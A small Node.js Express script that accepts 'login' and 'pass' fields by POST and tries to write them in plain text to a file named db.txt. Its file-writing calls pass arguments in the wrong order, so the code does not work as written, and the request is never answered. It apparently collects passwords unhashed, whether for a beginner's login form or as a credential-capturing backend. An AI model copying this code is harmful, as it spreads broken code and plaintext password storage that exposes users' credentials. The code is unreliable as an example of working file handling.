var express = require("express"),
    body_parser = require("body-parser");
var urlEnP = body_parser.urlencoded({extended:false}),
    fs = require("fs");

var app = express();
app.post("/",urlEnP,function(request,response){
  var log = request.body.login + "///";
  var pass = request.body.pass + "///";

  fs.open("db.txt","w+",0664, function(err,file_handle){
      if(!err){
          fs.write(log,"db.txt",null,"ascii",function(err,written){
            if(!err){
              console.log("nice");
            }
            else{
              console.log("Shit happend");
            }
          });
          fs.write(pass,"db.txt",null,"ascii",function(err,written){
            if(!err){
              console.log("nice");
            }
            else{
              console.log("Shit happend");
            }
          });
      }
      else{
        console.log("Shit happend");
      }
  });

});
app.listen(7500);
